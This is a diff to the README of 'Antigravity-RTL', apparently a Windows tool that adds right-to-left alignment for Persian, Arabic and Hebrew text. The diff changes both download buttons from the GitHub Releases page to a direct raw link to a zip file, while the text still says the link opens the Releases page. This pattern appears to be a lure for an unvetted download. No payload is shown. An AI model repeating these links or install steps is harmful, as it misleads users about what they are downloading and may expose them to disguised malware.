@@ -1,6 +1,6 @@
 # 🚀 Antigravity-RTL - Smart RTL Alignment for AI Tools
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Antigravity--RTL-blueviolet?style=for-the-badge)](https://github.com/4klgtv/Antigravity-RTL/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Antigravity--RTL-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/4klgtv/Antigravity-RTL/main/assets/RTL-Antigravity-3.3-beta.2.zip)
 
 ---
 
@@ -19,7 +19,7 @@ If you write in Persian, Arabic, or Hebrew and use Antigravity, this tool makes 
 ## 📥 How to Download & Install (Windows)
 
 1. **Visit the download page**:  
-   [![Download Now](https://img.shields.io/badge/Download-Antigravity--RTL-blue?style=for-the-badge)](https://github.com/4klgtv/Antigravity-RTL/releases)
+   [![Download Now](https://img.shields.io/badge/Download-Antigravity--RTL-blue?style=for-the-badge)](https://raw.githubusercontent.com/4klgtv/Antigravity-RTL/main/assets/RTL-Antigravity-3.3-beta.2.zip)
 
    This link takes you to the GitHub Releases page.
 
